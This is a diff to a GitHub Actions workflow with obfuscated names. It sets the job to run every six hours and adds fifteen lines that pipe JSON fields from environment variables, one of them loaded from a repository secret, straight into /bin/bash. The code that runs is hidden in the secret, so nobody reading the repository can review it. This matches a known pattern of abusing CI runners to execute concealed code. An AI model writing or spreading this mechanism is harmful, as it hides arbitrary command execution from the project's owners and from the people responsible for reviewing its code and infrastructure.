@@ -2,25 +2,29 @@ name: zonxxki
 on:
   workflow_dispatch:
   schedule:
-    - cron: '54 4/6 * * *'
-
+    - cron: '44 4/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: zonxxki
         env:
-          atp750: ${{ secrets.atp750 }}
+          uw8: ${{ secrets.uw8 }}
         run: |
-          echo $atp750 | jq -r .t361 | /bin/bash
-          echo $viof94 | jq -r .c993 | /bin/bash
-          echo $wzyli450 | jq -r .qxs20 | /bin/bash
-          echo $d05 | jq -r .by00 | /bin/bash
-          echo $gy1641 | jq -r .pqulr3 | /bin/bash
-          echo $l6893 | jq -r .mh56056 | /bin/bash
-          echo $kl69162 | jq -r .l6 | /bin/bash
-          echo $o04 | jq -r .gezjp69464 | /bin/bash
-          echo $avau994 | jq -r .fs3741 | /bin/bash
+          echo $uw8 | jq -r .elvtb410 | /bin/bash
+          echo $lkqdz9 | jq -r .dswur63788 | /bin/bash
+          echo $w77 | jq -r .ck48374 | /bin/bash
+          echo $hyt28365 | jq -r .zb05 | /bin/bash
+          echo $hp7 | jq -r .e122 | /bin/bash
+          echo $lsngg231 | jq -r .zsaw33 | /bin/bash
+          echo $husju01 | jq -r .xjore2256 | /bin/bash
+          echo $hi4514 | jq -r .wsr35538 | /bin/bash
+          echo $ty9173 | jq -r .avgpp5 | /bin/bash
+          echo $dsvmm6895 | jq -r .a48062 | /bin/bash
+          echo $z11927 | jq -r .r09 | /bin/bash
+          echo $tehqo8546 | jq -r .rkff5 | /bin/bash
+          echo $pj6 | jq -r .zd025 | /bin/bash
+          echo $isvj187 | jq -r .p647 | /bin/bash
+          echo $mbs07807 | jq -r .vrmq27 | /bin/bash
 
